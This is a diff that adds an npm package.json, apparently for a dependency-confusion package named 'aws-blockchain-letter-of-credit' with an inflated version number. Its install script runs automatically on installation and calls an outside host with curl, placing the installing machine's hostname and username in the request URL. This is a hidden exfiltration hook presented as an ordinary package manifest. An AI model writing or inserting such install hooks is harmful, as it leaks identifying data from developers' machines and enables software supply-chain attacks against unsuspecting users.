@@ -1,0 +1,14 @@
+{
+  "name": "aws-blockchain-letter-of-credit",
+  "version": "200.0.16",
+  "description": "aws-blockchain-letter-of-credit: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-aws-blockchain-letter-of-credit"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
